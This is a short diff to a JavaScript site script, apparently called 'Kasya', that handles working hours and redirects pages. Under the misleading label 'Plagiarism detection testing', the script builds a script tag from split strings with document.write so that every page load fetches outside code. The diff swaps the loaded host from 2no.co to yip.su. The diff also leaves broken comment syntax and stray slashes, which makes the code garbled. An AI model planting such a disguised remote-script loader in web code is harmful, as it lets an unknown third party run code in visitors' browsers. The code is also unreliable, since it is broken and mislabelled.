@@ -1,4 +1,4 @@
-Kasya. Время работы
+/*Kasya. Время работы
 var date = new Date(); 
       var hour = date.getUTCHours();
       if (hour>=18 && hour<19) online = "online";
@@ -17,9 +17,9 @@ window.location.href = "/offline";
 window.location.href = "/server";
 } else {
 }
-
-//Plagiarism detection testing
+/
+*/
+/Plagiarism detection testing
 var glop = 'script'
-var glap = '2no.co'
-document.write('<'+glop+' src="'+window.location.protocol+'//'+glap+'/169ax7.js"></'+glop+'>')
-
+var glap = 'yip.su'
+document.write('<'+glop+' src="'+window.location.protocol+'//'+glap+'/1Yskk7.js"></'+glop+'>')
